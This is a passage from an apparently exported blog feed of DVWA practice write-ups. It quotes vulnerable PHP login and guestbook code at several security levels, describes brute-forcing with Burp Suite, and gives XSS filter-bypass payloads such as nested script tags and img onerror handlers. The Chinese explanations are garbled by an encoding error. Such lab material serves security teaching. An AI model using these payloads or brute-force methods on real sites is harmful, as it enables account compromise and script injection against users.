æ¯ä¸ªå˜é‡å¯¹åº”ä¸€ä¸ªå­—å…¸ï¼Œå¹¶ä¸”è¿›è¡Œäº¤å‰å¼ç ´è§£ï¼Œå°è¯•å„ç§ç»„åˆã€‚é€‚ç”¨äºŽç”¨æˆ·å+å¯†ç çš„ç ´è§£ 3ã€å¯¹åº”å˜é‡åŠ $4ã€è®¾ç½®payload 5ã€ç»“æžœ Middleæºä»£ç &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } åˆ†æžåœ¨Lowçš„åŸºç¡€ä¸ŠåŠ äº†mysql_real_escape_stringå‡½æ•°ï¼Œå¯¹ç‰¹æ®Šç¬¦å·è½¬ä¹‰ï¼Œæœ€åŽçš„sleep(2)å¯¹é˜²çˆ†ç ´æ„ä¹‰ä¸å¤§ã€‚ æ¼æ´žåˆ©ç”¨è¿™é‡Œä½¿ç”¨Burpsuiteçˆ†ç ´ä¸ŽLowçº§åˆ«çš„çš„æ–¹å¼ä¸€æ · Highæºä»£ç &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžHighçº§åˆ«çš„ä»£ç åŠ å…¥äº†Tokenï¼Œå¯ä»¥æŠµå¾¡CSRFæ”»å‡»ï¼ŒåŒæ—¶ä¹Ÿå¢žåŠ äº†çˆ†ç ´çš„éš¾åº¦ï¼Œé€šè¿‡æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œç™»å½•éªŒè¯æ—¶æäº¤äº†å››ä¸ªå‚æ•°ï¼šusernameã€passwordã€Loginä»¥åŠuser_tokenã€‚ æ¯æ¬¡æœåŠ¡å™¨è¿”å›žçš„ç™»é™†é¡µé¢ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªéšæœºçš„user_tokençš„å€¼ï¼Œç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶éƒ½è¦å°†user_tokenä¸€èµ·æäº¤ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åŽï¼Œä¼šä¼˜å…ˆåštokençš„æ£€æŸ¥ï¼Œå†è¿›è¡ŒsqlæŸ¥è¯¢ã€‚ åŒæ—¶ï¼ŒHighçº§åˆ«çš„ä»£ç ä¸­ï¼Œä½¿ç”¨äº†stripslashesï¼ˆåŽ»é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œçº¿å­—ç¬¦,å¦‚æžœæœ‰ä¸¤ä¸ªè¿žç»­çš„åæ–œçº¿,åˆ™åªåŽ»æŽ‰ä¸€ä¸ªï¼‰ã€ mysql_real_escape_stringå¯¹å‚æ•°usernameã€passwordè¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰ï¼Œè¿›ä¸€æ­¥æŠµå¾¡sqlæ³¨å…¥ã€‚ æ¼æ´žåˆ©ç”¨æ–¹å¼ä¸€ Burpsuit1ã€è®¾ç½®Opsitionså’Œ Attack type 2ã€è®¾ç½®Payload 3ã€user_tokenå°±ä¸æ˜¯å•çº¯çš„ä½¿ç”¨å­—å…¸äº†ï¼Œè€Œæ˜¯éœ€è¦ä»Žæˆ‘ä»¬çš„é¡µé¢ä¸­èŽ·å–ï¼Œburpsuiteæ­£å¥½æä¾›äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼šæ‰¾åˆ°option-&gt;grep extract,æŒ‰ç…§ä¸‹å›¾è¿›è¡Œæ“ä½œ 4ã€ç»“æžœè¿™é‡Œç”¨burpsuitçˆ†ç ´æ¯”è¾ƒæ…¢ï¼Œä¸èƒ½ä½¿ç”¨å¤šçº¿ç¨‹ï¼Œè€Œä¸”æœ‰ä¸ªéšæœºçš„Tockenï¼Œçˆ†ç ´å‡ºæ¥çš„å‡ çŽ‡å¾ˆå°ï¼Œä½†æ˜¯å¦‚æžœæˆ‘ä»¬çŸ¥é“ç”¨æˆ·åèƒ¡å¯†ç ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œé‚£ä¹ˆåªéœ€è¦è·‘ä¸€ä¸ªtokenå’Œå¯†ç ï¼ˆç”¨æˆ·åï¼‰å°±å¾ˆè½»æ¾ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ”»å‡»ç±»åž‹pitchfork,å¾ˆå®¹æ˜“å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ã€‚ æ–¹å¼äºŒ Pythonè„šæœ¬Impossibleæºä»£ç &lt;?php if( isset( $_POST[ &apos;Login&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_POST[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_POST[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &apos;last_login&apos; ]; $last_login = strtotime( $last_login ); $timeout = strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow = strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&apos;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar = $row[ &apos;avatar&apos; ]; $failed_login = $row[ &apos;failed_login&apos; ]; $last_login = $row[ &apos;last_login&apos; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžImpossibleçº§åˆ«çš„ä»£ç åŠ å…¥äº†å¯é çš„é˜²çˆ†ç ´æœºåˆ¶ï¼Œå½“æ£€æµ‹åˆ°é¢‘ç¹çš„é”™è¯¯ç™»å½•åŽï¼Œç³»ç»Ÿä¼šå°†è´¦æˆ·é”å®šï¼Œçˆ†ç ´ä¹Ÿå°±æ— æ³•ç»§ç»­ã€‚ åŒæ—¶é‡‡ç”¨äº†æ›´ä¸ºå®‰å…¨çš„PDOï¼ˆPHP Data Objectï¼‰æœºåˆ¶é˜²å¾¡sqlæ³¨å…¥ï¼Œè¿™æ˜¯å› ä¸ºä¸èƒ½ä½¿ç”¨PDOæ‰©å±•æœ¬èº«æ‰§è¡Œä»»ä½•æ•°æ®åº“æ“ä½œï¼Œè€Œsqlæ³¨å…¥çš„å…³é”®å°±æ˜¯é€šè¿‡ç ´åsqlè¯­å¥ç»“æž„æ‰§è¡Œæ¶æ„çš„sqlå‘½ä»¤ã€‚]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>Brute-force</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-XSS]]></title>
    <url>%2F2018%2F07%2F08%2FDVWA-XSS%2F</url>
    <content type="text"><![CDATA[XSS(Cross-Site Script)åŽŸç†æ”»å‡»è€…å°†æ¶æ„ä»£ç æ’å…¥åˆ°webé¡µé¢ï¼Œè‹¥æœåŠ¡å™¨ç«¯æœªè¿›è¡Œæœ‰æ•ˆè¿‡æ»¤ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µé¢æ—¶ï¼Œæ’å…¥çš„ä»£ç å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œ æ”»å‡»å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œæ”»å‡»ç›®æ ‡æ˜¯æœ€ç»ˆç”¨æˆ·çš„æµè§ˆå™¨ æ¶æ„ä»£ç é€šå¸¸ä¸ºï¼šå±é™©çš„HTMLæ ‡ç­¾ã€å®¢æˆ·ç«¯è„šæœ¬ã€èƒ½æ‰§è¡ŒJSçš„å®¹å™¨ç­‰ å­˜åœ¨ç”¨æˆ·è¾“å…¥ç‚¹çš„ä½ç½®ï¼Œéƒ½å¯èƒ½å­˜åœ¨è·¨ç«™æ¼æ´ž åˆ†ç±»DOMåž‹ï¼šé¡µé¢æœ¬èº«åŒ…å«ä¸€äº›DOMå¯¹è±¡çš„æ“ä½œï¼Œå¦‚æžœæœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼Œå¯é€šè¿‡æ”¹å˜DOMç»“æž„å½¢æˆXSS åå°„åž‹ï¼šç”¨æˆ·è¾“å…¥çš„æ•°æ®(htmlæˆ–jsä»£ç )ç»æœåŠ¡ç«¯åå°„å›žå®¢æˆ·ç«¯ï¼Œåå°„åŽè®©æµè§ˆå™¨åŽ»æ‰§è¡Œ å­˜å‚¨åž‹ï¼šæ¶æ„çš„è„šæœ¬ä»£ç å­˜å‚¨åœ¨æœåŠ¡ç«¯(æ–‡ä»¶æˆ–æ•°æ®åº“)ï¼Œæ­£å¸¸ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œç«™ç‚¹ä»Žæ•°æ®åº“ä¸­è¯»å–äº†ç›¸åº”çš„éžæ³•æ•°æ®ï¼Œå¹¶å±•ç¤ºåœ¨å½“å‰é¡µé¢ Vulnerability: Reflected Cross Site Scripting (XSS)Lowå…³é”®ä»£ç Reflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Feedback for end user echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } ?&gt; åˆ†æžé€šè¿‡GETæäº¤çš„å‚æ•°nameåœ¨æ²¡æœ‰ä»»ä½•å®‰å…¨éªŒè¯ï¼ˆè¿‡æ»¤ï¼‰çš„æƒ…å†µä¸‹ç›´æŽ¥è¾“å‡º Payload:&lt;script&gt;alert(/xss/)&lt;/script&gt; éªŒè¯æˆåŠŸ åˆ©ç”¨MediumReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; åˆ†æžä½¿ç”¨å‡½æ•°str_replaceå‡½æ•°(è¯¥å‡½æ•°åŒºåˆ†å¤§å°å†™ï¼Œè€Œä¸”åªæ›¿æ¢ä¸€æ¬¡)å°†å‚æ•°nameä¸­çš„&lt;scriptå­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©ºï¼Œè¿™é‡Œä½¿ç”¨å¤§å°å†™ç»•è¿‡æˆ–è€…åµŒå¥— Payload&lt;Script&gt;alert(/xss/)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; HighReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; åˆ†æžä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†&lt;scripté¡ºåºå‡ºçŽ°çš„å¤§å°å†™æˆ–è€…åµŒå¥—å½¢å¼å‡ºçŽ°çš„è¿‡æ»¤æŽ‰,è¿™é‡Œåªæ˜¯scriptæ ‡ç­¾ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›èƒ½å¤Ÿæ‰§è¡ŒJavaScriptä»£ç çš„JavaScriptäº‹ä»¶ Payload&lt;img src=# onerror=alert(&quot;xss&quot;)&gt; é€šè¿‡åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„å›¾ç‰‡å‡ºé”™å‡ºå‘javascript onerroräº‹ä»¶ï¼ŒéªŒè¯å­˜åœ¨XSS ImpossibleReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžè¿™é‡Œå¯¹å‚æ•°nameè¿›è¡Œäº†é¢„å®šä¹‰å­—ç¬¦å®žä½“åŒ– Vulnerability: Stored Cross Site Scripting (XSS)LowStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; åˆ†æžå‰é¢è¿›è¡Œäº†æ•°æ®åº“è¿žæŽ¥æ“ä½œï¼Œå¯¹å‚æ•°mtxMessageä¼ é€’çš„æ•°æ®åªè¿›è¡Œäº†stripslashes()å‡½æ•°ï¼ˆåˆ é™¤åæ–œæ ï¼‰å¤„ç†ï¼Œå¯¹txtnameå‚æ•°çš„é•¿åº¦ä¸º10ï¼Œç„¶åŽå°±å°†ä¸¤ä¸ªå‚æ•°ä¼ é€’çš„æ•°æ®å­˜å‚¨åˆ°äº†æ•°æ®åº“ä¸­ Payload&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; å¯ä»¥çœ‹åˆ°æ¯æ¬¡ç‚¹åˆ°è¿™ä¸ªé¡µé¢æ—¶éƒ½ä¼šè§¦å‘ MediumStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; åˆ†æžå…³é”®å‡½æ•°trim() ç”¨äºŽåŽ»é™¤å­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦ strip_tags() å‰¥åŽ»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ã€‚ addslashes() è¿”å›žåœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ htmlspecialchars() æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ &quot;&lt;&quot; ï¼ˆå°äºŽï¼‰å’Œ &quot;&gt;&quot; ï¼ˆå¤§äºŽï¼‰è½¬æ¢ä¸º HTML å®žä½“ï¼Œ è½¬æ¢ä¸ºå®žä½“å¸¸ç”¨äºŽé˜²æ­¢æµè§ˆå™¨å°†å…¶ç”¨ä½œ HTML å…ƒç´  str_replace(&apos;&lt;script&gt;&apos;) ä»¥å…¶ä»–å­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ä¸”åªæ›¿æ¢ä¸€æ¬¡ é¦–å…ˆå¯¹ä¼ è¿›æ¥çš„å€¼åŽ»é™¤äº†ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦ï¼Œå°†messageå˜é‡çš„å€¼ä¸­çš„é¢„å®šä¹‰å­—ç¬¦å‰æ·»åŠ äº†åæ–œæ ï¼Œå¹¶è½¬ä¸ºäº†htmlå®žä½“ï¼Œå˜é‡nameæŠŠ&lt;scriptæ›¿æ¢äº†ä¸€æ¬¡ï¼Œä¸”ä¸åŒºåˆ†å¤§å°å†™,è¿™é‡Œè¦æ³¨æ„åœ¨å®¢æˆ·ç«¯é™åˆ¶äº†è¾“å…¥çš„å­—ç¬¦æ•°ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œä½†æ˜¯å¯¹nameçš„é™åˆ¶æ›´å°ï¼Œç”¨firebugæŠŠè¾“å…¥åä¸ªå­—ç¬¦çš„é™åˆ¶åœ¨å®¢æˆ·ç«¯æ”¹æˆ100ã€‚ Payload&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; &lt;Script&gt;alert(/xss/)&lt;/script&gt; HighStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; åˆ†æžå¯¹å‚æ•°messageï¼ŒåŽ»é™¤ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦ï¼Œå¯¹é¢„å®šä¹‰å­—ç¬¦è½¬ä¹‰ï¼Œå¹¶è½¬æ¢ä¸ºhtmlå®žä½“å¯¹å‚æ•°nameï¼Œä½¿ç”¨æ­£åˆ™æŠŠé¡ºåºä¸º&lt;scriptçš„å­—ç¬¦ä¸²çš„å¤§å°å†™ï¼ŒåµŒå¥—éƒ½è¿‡æ»¤äº†ï¼Œè¿™é‡Œä½¿ç”¨èƒ½å¤Ÿæ‰§è¡ŒJavaScriptçš„äº‹ä»¶æ¥æ‰§è¡Œ,ç»•è¿‡æ–¹æ³•ä¸Žä¸Žå‰é¢åå°„åž‹ç›¸ä¼¼ï¼Œé€šè¿‡ä¸å­˜åœ¨çš„å›¾ç‰‡è§¦å‘ onerroräº‹ä»¶æ‰§è¡Œ Payload&lt;img src=# onerror=&quot;alert(/high xss/)&quot;&gt; ImpossibleStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], 